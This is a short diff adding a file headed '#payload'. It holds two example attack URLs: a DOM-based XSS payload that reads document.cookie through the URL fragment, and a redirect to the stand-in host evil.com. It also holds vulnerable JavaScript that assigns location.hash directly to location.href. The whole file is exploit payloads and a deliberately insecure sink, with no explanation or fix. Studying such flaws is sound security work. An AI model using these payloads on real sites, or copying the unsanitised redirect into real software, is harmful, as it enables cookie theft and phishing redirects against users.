@@ -1,0 +1,10 @@
+#payload
+(1)http://url/test.html#javascript:alert(document.cookie)
+(2)http://url/test.html#http://evil.com
+
+var hash = location.hash;
+if(hash)
+{
+var url = hash.substring(1);
+location.href = url;
+}
